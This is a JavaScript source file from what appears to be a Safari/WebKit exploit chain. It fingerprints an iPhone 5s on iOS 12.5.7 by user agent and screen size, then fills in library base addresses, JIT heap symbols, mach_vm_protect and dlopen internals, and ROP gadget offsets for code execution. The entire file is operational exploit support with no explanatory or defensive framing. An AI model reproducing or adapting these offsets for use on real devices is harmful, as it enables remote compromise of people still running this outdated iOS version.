const offsets_obj = {
    WEBCORE_BASE: undefined,
    JSC_BASE: undefined,
    COREAUDIO_BASE: undefined,
    LIBCPP1_BASE: undefined,
    LIBSYSTEM_PLATFORM_BASE: undefined,
    LIBSYSTEM_KERNEL_BASE: undefined,
    LIBDYLD_BASE: undefined,

    __MergedGlobals_52: undefined,
    memPoolStart: undefined,
    memPoolEnd: undefined,
    jitWriteSeparateHeaps: undefined,
    longjmp: undefined,
    usleep: undefined,
    mach_vm_protect: undefined,
    mach_task_self_: undefined,

    __ZZ6dlopenE1p: undefined,
    dlopen_internal: undefined,
    cookieAddr: undefined,

    stackloader: undefined,
    ldrx8: undefined,
    dispatch: undefined,
    movx4: undefined,
    regloader: undefined,

    resolve() {
        // iOS 12.5.7, iPhone 5s
        // Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1
        if (navigator.userAgent.match(/iPhone OS 12_5_7/) && window.screen.width == 320 && window.screen.height == 568) {
            log("[i] offsets selected for iPhone 5s, iOS 12.5.7");
            this.WEBCORE_BASE = 0x187F75C;
            this.JSC_BASE = 0x1738000;
            this.COREAUDIO_BASE = 0x5573000;
            this.LIBCPP1_BASE = 0x976C000;
            this.LIBSYSTEM_PLATFORM_BASE = 0x8CCE000;
            this.LIBSYSTEM_KERNEL_BASE = 0x8D5D000;
            this.LIBDYLD_BASE = 0x8E88000;

            this.__MergedGlobals_52 = 0x32559040;
            this.memPoolStart = 0xC8;
            this.memPoolEnd = 0xD0;
            this.jitWriteSeparateHeaps = 0x3255A438;
            this.longjmp = 0x16f8;
            this.usleep = 0x1810BA4;
            this.mach_vm_protect = 0x2156c;
            this.mach_task_self_ = 0x39AD1AAC;

            this.__ZZ6dlopenE1p = 0x39BFA9E8;
            this.dlopen_internal = 0xc918;
            this.cookieAddr = (0x8ECA0 + 0x38);

            this.stackloader = 0x9594;
            this.ldrx8 = 0x185AB8;
            this.dispatch = 0x100F54;
            this.movx4 = 0x861F08;
            this.regloader = 0x25D18;
        }
        else {
            throw "Unknown platform: " + navigator.userAgent;
        }
    }
};

const offsets = new Proxy(offsets_obj, {
    get(target, property) {
        if (target[property] === undefined) {
            throw `Using undefined offset ${property}`;
        }
        return target[property];
    }
});
